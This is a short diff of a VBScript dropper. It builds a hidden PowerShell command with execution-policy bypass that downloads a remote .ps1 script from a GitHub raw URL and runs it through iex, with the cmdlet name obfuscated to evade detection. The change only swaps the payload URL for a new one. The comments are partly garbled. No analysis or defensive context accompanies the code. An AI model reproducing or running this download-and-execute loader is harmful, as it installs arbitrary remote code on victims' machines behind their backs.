@@ -4,7 +4,7 @@ Set o = CreateObject("WScript.Shell") ' Initialize the WScript.Shell object
 sA = "powershell.exe -W 1 -Exec B -C "
  
 ' Define the RL of thript
-sB = "$u='https://github.com/smad1252/gcj-gjhcv/raw/refs/heads/main/youtube.ps1';"
+sB = "$u='https://github.com/smad1252/sert-xdfgd/raw/refs/heads/main/saadi.ps1';"
  
 ' Defihe command to eecute the ript content
 sC = "iex(i'w'r $u -UseB).COnteNt"
